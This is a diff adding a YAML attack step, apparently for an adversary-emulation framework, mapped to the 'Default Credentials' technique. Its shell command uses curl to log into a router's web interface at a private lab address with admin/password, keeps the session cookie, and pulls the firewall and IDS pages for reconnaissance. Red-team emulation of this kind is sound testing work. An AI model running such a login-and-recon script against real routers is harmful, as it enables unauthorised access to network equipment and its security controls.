@@ -1,0 +1,28 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000001
+  name: Router - Default Credential Login and Recon
+  description: |
+    Login to router Flask UI using actual /login endpoint with form POST
+  tactic: lateral-movement
+  technique_id: T0812
+  technique_name: Default Credentials
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/router.jar
+      -d "username=admin&password=password"
+      "http://192.168.90.200:5000/login"
+      -o /tmp/router_login.html -w "%{http_code}" &&
+      curl -s -b /tmp/router.jar
+      "http://192.168.90.200:5000/firewall"
+      -o /tmp/router_fw.html &&
+      grep -qi "firewall\|rule\|chain" /tmp/router_fw.html &&
+      echo "ROUTER_LOGIN_SUCCESS" || echo "ROUTER_LOGIN_FAILED" &&
+      echo "=== IDS Page ===" &&
+      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/ids"
+      -o /tmp/router_ids.html &&
+      grep -c "alert" /tmp/router_ids.html &&
+      echo "ROUTER_RECON_COMPLETE"
+    timeout: 60
